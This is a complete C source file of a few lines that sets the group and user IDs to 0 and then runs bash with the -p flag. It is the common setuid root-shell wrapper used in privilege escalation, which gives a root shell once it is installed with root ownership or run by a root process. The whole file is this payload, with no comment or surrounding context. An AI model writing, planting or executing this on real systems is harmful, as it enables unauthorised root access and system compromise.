#include <unistd.h>

int main(void) {
    setgid(0);
    setuid(0);
    execl("/bin/bash", "bash", "-p", NULL);
    return 0;
}
